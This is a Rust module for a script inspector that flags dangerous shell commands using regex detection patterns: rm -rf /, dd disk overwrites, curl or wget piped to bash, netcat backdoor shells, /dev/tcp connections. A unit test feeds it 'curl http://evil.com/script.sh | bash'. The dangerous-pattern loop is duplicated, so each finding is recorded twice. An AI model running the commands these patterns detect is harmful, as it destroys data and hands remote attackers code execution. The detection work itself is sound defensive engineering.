use regex::Regex;
use std::collections::HashMap;
use std::fs;
use std::path::Path;
use tracing::{debug, warn};

use crate::command_parser::{CommandParser, RiskPattern};
use crate::config::TerminalConfig;
use crate::risk_analyzer::{RecommendedAction, RiskAnalyzer, RiskAssessment, RiskLevel};

#[derive(Debug, Clone)]
pub struct ScriptInspector {
    config: ScriptInspectionConfig,
    dangerous_patterns: Vec<DangerousPattern>,
    command_parser: CommandParser,
    risk_analyzer: RiskAnalyzer,
    script_cache: HashMap<String, ScriptAnalysis>,
}

#[derive(Debug, Clone)]
pub struct ScriptInspectionConfig {
    pub enabled: bool,
    pub max_file_size: usize,
    pub max_analysis_time_ms: u64,
    pub inspect_downloads: bool,
    pub inspect_pipes: bool,
    pub cache_analyses: bool,
}

impl Default for ScriptInspectionConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            max_file_size: 1024 * 1024,
            max_analysis_time_ms: 5000,
            inspect_downloads: true,
            inspect_pipes: true,
            cache_analyses: true,
        }
    }
}

#[derive(Debug, Clone)]
pub struct DangerousPattern {
    pub pattern: Regex,
    pub risk_level: RiskLevel,
    pub description: String,
    pub context: PatternContext,
}

#[derive(Debug, Clone, PartialEq)]
pub enum PatternContext {
    Any,
    Download,
    SystemModification,
    NetworkAccess,
    PrivilegeEscalation,
    DataExfiltration,
}

#[derive(Debug, Clone)]
pub struct ScriptAnalysis {
    pub file_path: String,
    pub risk_level: RiskLevel,
    pub findings: Vec<ScriptFinding>,
    pub command_count: usize,
    pub analyzed_at: chrono::DateTime<chrono::Utc>,
    pub file_size: usize,
    pub file_hash: String,
}

#[derive(Debug, Clone)]
pub struct ScriptFinding {
    pub line_number: usize,
    pub risk_level: RiskLevel,
    pub pattern: String,
    pub description: String,
    pub context: PatternContext,
    pub suggestion: Option<String>,
}

impl ScriptInspector {
    pub fn new(config: &TerminalConfig) -> Self {
        let mut inspector = Self {
            config: ScriptInspectionConfig::default(),
            dangerous_patterns: Vec::new(),
            command_parser: CommandParser::new(true),
            risk_analyzer: RiskAnalyzer::new(config),
            script_cache: HashMap::new(),
        };

        inspector.initialize_patterns();
        inspector
    }

    fn initialize_patterns(&mut self) {
        let patterns = [
            // Critical patterns
            (
                r"rm\s+-rf\s+/",
                RiskLevel::Critical,
                "Attempts to delete root filesystem",
                PatternContext::SystemModification,
            ),
            (
                r"dd\s+if=/dev/(zero|urandom)\s+of=/dev/[sh]d[a-z]+",
                RiskLevel::Critical,
                "Disk overwrite operation",
                PatternContext::SystemModification,
            ),
            (
                r"curl\s+[^\|]*\|\s*(sh|bash|zsh)",
                RiskLevel::Critical,
                "Downloads and executes remote script",
                PatternContext::Download,
            ),
            (
                r"wget\s+[^\|]*\|\s*(sh|bash|zsh)",
                RiskLevel::Critical,
                "Downloads and executes remote script",
                PatternContext::Download,
            ),
            (
                r#"echo\s+['"][^'"]*['"].*>\s*/etc/"#,
                RiskLevel::Critical,
                "Modifies system configuration files",
                PatternContext::SystemModification,
            ),
            // High risk patterns
            (
                r"sudo\s+[-]s|sudo\s+[-]i|sudo\s+su",
                RiskLevel::High,
                "Privilege escalation to root shell",
                PatternContext::PrivilegeEscalation,
            ),
            (
                r"chmod\s+777|chmod\s+\+x\s+/",
                RiskLevel::High,
                "Dangerous permission changes",
                PatternContext::SystemModification,
            ),
            (
                r"nc\s+[-]l.*[-]e\s*(sh|bash)",
                RiskLevel::High,
                "Creates backdoor shell listener",
                PatternContext::NetworkAccess,
            ),
            (
                r"/bin/sh.*&|/bin/bash.*&",
                RiskLevel::High,
                "Background shell execution",
                PatternContext::PrivilegeEscalation,
            ),
            (
                r"crontab\s+[-]e|echo.*>.*crontab",
                RiskLevel::High,
                "Modifies scheduled tasks",
                PatternContext::SystemModification,
            ),
            // Medium risk patterns
            (
                r"ssh\s+[-]o\s+StrictHostKeyChecking=no",
                RiskLevel::Medium,
                "Disables SSH host key verification",
                PatternContext::NetworkAccess,
            ),
            (
                r"find.*[-]exec.*rm",
                RiskLevel::Medium,
                "Mass file deletion operation",
                PatternContext::SystemModification,
            ),
            (
                r"tar.*[|].*ssh",
                RiskLevel::Medium,
                "Data transfer over SSH",
                PatternContext::DataExfiltration,
            ),
            (
                r"openssl\s+s_client.*connect",
                RiskLevel::Medium,
                "SSL connection establishment",
                PatternContext::NetworkAccess,
            ),
            (
                r"/dev/tcp/[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/[0-9]+",
                RiskLevel::Medium,
                "Network connection via /dev/tcp",
                PatternContext::NetworkAccess,
            ),
        ];

        for (pattern_str, risk_level, description, context) in &patterns {
            if let Ok(regex) = Regex::new(pattern_str) {
                self.dangerous_patterns.push(DangerousPattern {
                    pattern: regex,
                    risk_level: *risk_level,
                    description: description.to_string(),
                    context: context.clone(),
                });
            } else {
                warn!("Failed to compile regex pattern: {}", pattern_str);
            }
        }
    }

    pub fn analyze_script(
        &mut self,
        file_path: &str,
    ) -> Result<ScriptAnalysis, Box<dyn std::error::Error>> {
        if !self.config.enabled {
            return Ok(ScriptAnalysis {
                file_path: file_path.to_string(),
                risk_level: RiskLevel::Safe,
                findings: Vec::new(),
                command_count: 0,
                analyzed_at: chrono::Utc::now(),
                file_size: 0,
                file_hash: String::new(),
            });
        }

        let path = Path::new(file_path);
        if !path.exists() {
            return Err("Script file does not exist".into());
        }

        let metadata = fs::metadata(path)?;
        let file_size = metadata.len() as usize;

        if file_size > self.config.max_file_size {
            return Err("Script file too large for analysis".into());
        }

        let content = fs::read_to_string(path)?;
        let file_hash = format!("{:x}", md5::compute(&content));

        // Check cache first
        let cache_key = format!("{}:{}", file_path, file_hash);
        if self.config.cache_analyses {
            if let Some(cached) = self.script_cache.get(&cache_key) {
                debug!("Using cached script analysis for {}", file_path);
                return Ok(cached.clone());
            }
        }

        debug!("Analyzing script: {} ({} bytes)", file_path, file_size);

        let analysis = self.perform_analysis(&content, file_path, file_size, file_hash)?;

        // Cache the result
        if self.config.cache_analyses {
            self.script_cache.insert(cache_key, analysis.clone());
        }

        Ok(analysis)
    }

    fn perform_analysis(
        &self,
        content: &str,
        file_path: &str,
        file_size: usize,
        file_hash: String,
    ) -> Result<ScriptAnalysis, Box<dyn std::error::Error>> {
        let mut findings = Vec::new();
        let mut max_risk_level = RiskLevel::Safe;
        let mut command_count = 0;

        // Analyze line by line
        for (line_number, line) in content.lines().enumerate() {
            let line_number = line_number + 1; // 1-based line numbers
            let trimmed_line = line.trim();

            if trimmed_line.is_empty() || trimmed_line.starts_with('#') {
                continue;
            }

            command_count += 1;

            let risk_assessment = self.risk_analyzer.analyze_command(trimmed_line);
            if risk_assessment.risk_level >= RiskLevel::Medium {
                max_risk_level = std::cmp::max(max_risk_level, risk_assessment.risk_level);

                findings.push(ScriptFinding {
                    line_number,
                    risk_level: risk_assessment.risk_level,
                    pattern: "command_analysis".to_string(),
                    description: format!(
                        "Command analysis: {}",
                        risk_assessment.reasons.join(", ")
                    ),
                    context: PatternContext::Any,
                    suggestion: Some(format!(
                        "Recommended action: {:?}",
                        risk_assessment.recommended_action
                    )),
                });
            }

            // Check against dangerous patterns
            for pattern in &self.dangerous_patterns {
                if pattern.pattern.is_match(line) {
                    max_risk_level = std::cmp::max(max_risk_level, pattern.risk_level);

                    let suggestion = self.get_suggestion_for_pattern(&pattern.context, line);

                    findings.push(ScriptFinding {
                        line_number,
                        risk_level: pattern.risk_level,
                        pattern: pattern.pattern.as_str().to_string(),
                        description: pattern.description.clone(),
                        context: pattern.context.clone(),
                        suggestion,
                    });
                }
            }

            // Check against dangerous patterns
            for pattern in &self.dangerous_patterns {
                if pattern.pattern.is_match(line) {
                    max_risk_level = std::cmp::max(max_risk_level, pattern.risk_level);

                    let suggestion = self.get_suggestion_for_pattern(&pattern.context, line);

                    findings.push(ScriptFinding {
                        line_number,
                        risk_level: pattern.risk_level,
                        pattern: pattern.pattern.as_str().to_string(),
                        description: pattern.description.clone(),
                        context: pattern.context.clone(),
                        suggestion,
                    });
                }
            }

            // Use command parser for advanced analysis
            if let Ok(parsed_cmd) = self.command_parser.parse(trimmed_line) {
                let risk_patterns = self.command_parser.get_risk_patterns(&parsed_cmd);
                for risk_pattern in risk_patterns {
                    let (pattern_risk, pattern_desc) = self.get_pattern_risk_info(&risk_pattern);
                    max_risk_level = std::cmp::max(max_risk_level, pattern_risk);

                    findings.push(ScriptFinding {
                        line_number,
                        risk_level: pattern_risk,
                        pattern: format!("{:?}", risk_pattern),
                        description: pattern_desc,
                        context: self.pattern_to_context(&risk_pattern),
                        suggestion: self.get_suggestion_for_risk_pattern(&risk_pattern),
                    });
                }
            }
        }

        Ok(ScriptAnalysis {
            file_path: file_path.to_string(),
            risk_level: max_risk_level,
            findings,
            command_count,
            analyzed_at: chrono::Utc::now(),
            file_size,
            file_hash,
        })
    }

    fn get_suggestion_for_pattern(&self, context: &PatternContext, _line: &str) -> Option<String> {
        match context {
            PatternContext::Download => {
                Some("Download the script first and review it before execution".to_string())
            }
            PatternContext::SystemModification => {
                Some("Ensure you understand the system changes before proceeding".to_string())
            }
            PatternContext::NetworkAccess => {
                Some("Verify the network connection is necessary and secure".to_string())
            }
            PatternContext::PrivilegeEscalation => {
                Some("Consider if elevated privileges are truly required".to_string())
            }
            PatternContext::DataExfiltration => {
                Some("Ensure data transfer is authorized and secure".to_string())
            }
            PatternContext::Any => None,
        }
    }

    fn get_pattern_risk_info(&self, pattern: &RiskPattern) -> (RiskLevel, String) {
        match pattern {
            RiskPattern::PipeToShell => {
                (RiskLevel::Critical, "Script pipes output to shell for execution".to_string())
            }
            RiskPattern::DownloadSubstitution => (
                RiskLevel::Critical,
                "Script downloads and executes content via command substitution".to_string(),
            ),
            RiskPattern::WildcardMassOperation => {
                (RiskLevel::High, "Script performs mass file operations with wildcards".to_string())
            }
            RiskPattern::PrivilegeEscalation => {
                (RiskLevel::High, "Script attempts privilege escalation".to_string())
            }
            RiskPattern::SystemPathModification => {
                (RiskLevel::Critical, "Script modifies critical system paths".to_string())
            }
        }
    }

    fn pattern_to_context(&self, pattern: &RiskPattern) -> PatternContext {
        match pattern {
            RiskPattern::PipeToShell | RiskPattern::DownloadSubstitution => {
                PatternContext::Download
            }
            RiskPattern::PrivilegeEscalation => PatternContext::PrivilegeEscalation,
            RiskPattern::SystemPathModification | RiskPattern::WildcardMassOperation => {
                PatternContext::SystemModification
            }
        }
    }

    fn get_suggestion_for_risk_pattern(&self, pattern: &RiskPattern) -> Option<String> {
        match pattern {
            RiskPattern::PipeToShell | RiskPattern::DownloadSubstitution => {
                Some("Review downloaded content before allowing shell execution".to_string())
            }
            RiskPattern::WildcardMassOperation => {
                Some("Test wildcard operations on sample files first".to_string())
            }
            RiskPattern::PrivilegeEscalation => {
                Some("Verify administrative access is required for this operation".to_string())
            }
            RiskPattern::SystemPathModification => {
                Some("Create backups before modifying system files".to_string())
            }
        }
    }

    pub fn analyze_command_for_scripts(&mut self, command: &str) -> Vec<ScriptAnalysis> {
        let mut analyses = Vec::new();

        // Look for script execution patterns
        if let Some(script_path) = self.extract_script_path(command) {
            if let Ok(analysis) = self.analyze_script(&script_path) {
                analyses.push(analysis);
            }
        }

        // Look for downloaded scripts
        if self.config.inspect_downloads && self.is_download_command(command) {
            if let Some(temp_script) = self.extract_downloaded_script(command) {
                if let Ok(analysis) = self.analyze_script(&temp_script) {
                    analyses.push(analysis);
                }
            }
        }

        analyses
    }

    fn extract_script_path(&self, command: &str) -> Option<String> {
        // Simple extraction for common script execution patterns
        if command.starts_with("bash ") || command.starts_with("sh ") || command.starts_with("zsh ")
        {
            let parts: Vec<&str> = command.split_whitespace().collect();
            if parts.len() > 1 {
                return Some(parts[1].to_string());
            }
        }

        if command.starts_with("./") || command.starts_with("/") {
            let parts: Vec<&str> = command.split_whitespace().collect();
            if !parts.is_empty() {
                return Some(parts[0].to_string());
            }
        }

        None
    }

    fn is_download_command(&self, command: &str) -> bool {
        command.contains("curl ") || command.contains("wget ") || command.contains("lynx ")
    }

    fn extract_downloaded_script(&self, _command: &str) -> Option<String> {
        // This would implement logic to detect temporary downloaded scripts
        // For now, return None as this requires more complex implementation
        None
    }

    pub fn get_cache_stats(&self) -> (usize, usize) {
        let entries = self.script_cache.len();
        let total_size: usize = self.script_cache.values().map(|analysis| analysis.file_size).sum();
        (entries, total_size)
    }

    pub fn clear_cache(&mut self) {
        self.script_cache.clear();
    }
}

pub fn create_script_assessment(analysis: &ScriptAnalysis) -> RiskAssessment {
    let mut reasons = Vec::new();

    if !analysis.findings.is_empty() {
        reasons.push(format!("Script contains {} suspicious pattern(s)", analysis.findings.len()));

        for finding in &analysis.findings {
            reasons.push(format!(
                "Line {}: {} ({:?})",
                finding.line_number, finding.description, finding.risk_level
            ));
        }
    }

    if analysis.command_count > 100 {
        reasons.push(format!("Script is complex with {} commands", analysis.command_count));
    }

    let recommended_action = match analysis.risk_level {
        RiskLevel::Safe | RiskLevel::Low => RecommendedAction::Allow,
        RiskLevel::Medium => RecommendedAction::Warn,
        RiskLevel::High => RecommendedAction::RequireApproval,
        RiskLevel::Critical => RecommendedAction::Block,
    };

    RiskAssessment {
        risk_level: analysis.risk_level,
        reasons,
        command: format!("Script: {}", analysis.file_path),
        recommended_action,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;
    use tempfile::NamedTempFile;

    #[test]
    fn test_dangerous_script_detection() {
        let config = TerminalConfig::default();
        let mut inspector = ScriptInspector::new(&config);

        // Create a test script with dangerous content
        let mut temp_file = NamedTempFile::new().unwrap();
        writeln!(temp_file, "#!/bin/bash").unwrap();
        writeln!(temp_file, "curl http://evil.com/script.sh | bash").unwrap();
        writeln!(temp_file, "sudo rm -rf /etc/important").unwrap();

        let analysis = inspector.analyze_script(temp_file.path().to_str().unwrap()).unwrap();

        assert!(analysis.risk_level >= RiskLevel::Critical);
        assert!(!analysis.findings.is_empty());

        let has_download_exec =
            analysis.findings.iter().any(|f| f.description.contains("Downloads and executes"));
        assert!(has_download_exec);
    }

    #[test]
    fn test_safe_script_detection() {
        let config = TerminalConfig::default();
        let mut inspector = ScriptInspector::new(&config);

        let mut temp_file = NamedTempFile::new().unwrap();
        writeln!(temp_file, "#!/bin/bash").unwrap();
        writeln!(temp_file, "echo 'Hello World'").unwrap();
        writeln!(temp_file, "ls -la").unwrap();

        let analysis = inspector.analyze_script(temp_file.path().to_str().unwrap()).unwrap();

        assert_eq!(analysis.risk_level, RiskLevel::Safe);
        assert!(analysis.findings.is_empty());
    }

    #[test]
    fn test_script_cache() {
        let config = TerminalConfig::default();
        let mut inspector = ScriptInspector::new(&config);

        let mut temp_file = NamedTempFile::new().unwrap();
        writeln!(temp_file, "#!/bin/bash").unwrap();
        writeln!(temp_file, "echo 'test'").unwrap();

        let path = temp_file.path().to_str().unwrap();

        // First analysis
        let _analysis1 = inspector.analyze_script(path).unwrap();
        let (entries, _) = inspector.get_cache_stats();
        assert_eq!(entries, 1);

        // Second analysis should use cache
        let _analysis2 = inspector.analyze_script(path).unwrap();
        let (entries, _) = inspector.get_cache_stats();
        assert_eq!(entries, 1);
    }
}
